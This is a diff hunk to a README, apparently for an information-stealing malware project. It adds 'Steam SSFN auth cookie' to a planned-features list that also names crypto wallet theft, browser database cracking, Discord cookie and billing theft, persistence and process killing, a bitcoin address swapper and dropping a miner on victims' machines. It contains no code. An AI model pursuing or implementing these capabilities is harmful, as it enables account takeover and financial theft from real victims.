@@ -11,6 +11,7 @@ DO NOT USE LATEST RELEASE IT WILL NOT WORK, download the zip from here:https://g
 #### Upcoming features
 ```
 • More data(more crypto wallet, more Browser database cracking n more app stealing)
+• Steam SSFN auth cookie
 • Discord cookie info (email, billing, etc)
 • Startup Functionality(injector,Disabling certain apps like SystemSettings.exe by ending process, other malware capabilities)
 • Cryptojacking(Btc address swapper, downloading crypto miner,probably xmrig, on victims computer)
